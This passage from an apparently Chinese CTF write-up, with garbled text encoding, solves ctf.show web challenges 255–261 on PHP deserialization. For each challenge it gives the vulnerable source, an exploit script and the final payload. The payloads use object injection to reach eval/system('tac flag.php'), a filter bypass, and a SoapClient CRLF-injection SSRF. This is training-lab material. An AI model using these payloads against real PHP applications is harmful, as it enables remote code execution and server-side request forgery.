<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?username=a&amp;password=a</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>9ade9863-8899-4452-958a-4cc9e26290ee.challenge.ctf.show</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22a%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ„é€ exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?username=a&amp;password=b</span><br><span class="line"></span><br><span class="line">Cookieï¼š</span><br><span class="line">user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ææ„æ—¶è°ƒç”¨åé—¨å‡½æ•°æ‰§è¡Œå‘½ä»¤å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?username=a&amp;password=a</span><br><span class="line">Cookieï¼š</span><br><span class="line">user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22tac+flag.php%22%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>expä¸ä¸Šé¢˜åŸºæœ¬ä¸€è‡´ï¼Œæ³¨æ„å˜æ›´ä¸º<code>public</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="comment">// print_r(serialize($a).PHP_EOL);</span></span><br><span class="line"><span class="comment">// O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&quot;tac flag.php&quot;);&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨ä¸¤å¤„O:åé¢æ·»åŠ +åurlç¼–ç ä¸€ä¸‹å³å¯</span></span><br><span class="line"><span class="comment">// O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&quot;tac flag.php&quot;);&quot;;&#125;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&quot;tac flag.php&quot;);&quot;;&#125;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?username=a&amp;password=a</span><br><span class="line">Cookie:</span><br><span class="line">user=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system(%22tac%20flag.php%22)%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p><strong>flag.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åª<code>XFF</code>æ²¡ç”¨ï¼Œä¼°è®¡è¿˜åˆ¤æ–­äº†ä¸‹çœŸå®<code>ip</code></p>
<p><strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè°ƒç”¨<code>call</code>ï¼Œæ•…ä½¿ç”¨åŸç”Ÿç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$soapclient</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$soapclient</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ<code>payload</code>ï¼Œç„¶åè®¿é—®<code>flag.txt</code>å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?vip=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A138%3A%22ctfshow%0D%0AX-Forwarded-For%3A127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­å«æœ‰<code>ctfshow_i_love_36D</code>å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure>

<h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span 